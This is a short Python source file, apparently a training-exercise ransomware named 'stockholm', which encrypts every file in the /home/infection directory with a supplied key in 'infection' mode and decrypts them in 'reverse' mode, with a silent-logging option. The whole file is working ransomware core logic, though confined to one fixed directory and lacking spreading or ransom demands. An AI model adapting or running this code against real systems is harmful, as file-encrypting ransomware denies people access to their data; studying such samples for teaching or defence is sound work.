from utils import log
import os
from os.path import isfile, join
from encryption import ft_encrypt, ft_decrypt

SILENT_ENABLED = False
INFECTION_DIR = "/home/infection"
MINIMUM_KEY_LEN=16

def infect_file(key, path):
	log(f"Infecting {path}")
	encrypted = ""
	with open(path, 'rb') as file:
		content = file.read()
		encrypted = ft_encrypt(key, content)
	
	with open(path, 'wb') as file:
		file.write(encrypted)

def reverse_file(key, path):
	log(f"Reversing {path}")
	content = ""
	with open(path, 'rb') as file:
		encrypted = file.read()
		content = ft_decrypt(key, encrypted)
	
	with open(path, 'wb') as file:
		file.write(content)
	
def infect_directory(key, directory):
	files = [join(directory, f) for f in os.listdir(directory) if isfile(join(directory, f))]

	for f in files:
		try:
			infect_file(key, f)
		except Exception:
			log("Error: Decryption failed")

def reverse_directory(key, directory):
	files = [join(directory, f) for f in os.listdir(directory) if isfile(join(directory, f))]

	for f in files:
		try:
			reverse_file(key, f)
		except Exception:
			log("Error: Decryption failed")

def key_is_valid(key):
	return len(key) >= MINIMUM_KEY_LEN

def stockholm(args):
	global SILENT_ENABLED
	SILENT_ENABLED = args.silent

	if not key_is_valid(args.key):
		raise ValueError("Requires a 16 characters key as argument")

	if not os.path.exists(INFECTION_DIR):
		raise ValueError("Target directory \'/home/infection\' does not exist.")

	if args.reverse:
		log("Reverse mode enabled")
		reverse_directory(args.key, INFECTION_DIR)
	else:
		log("Infection mode enabled")
		infect_directory(args.key, INFECTION_DIR)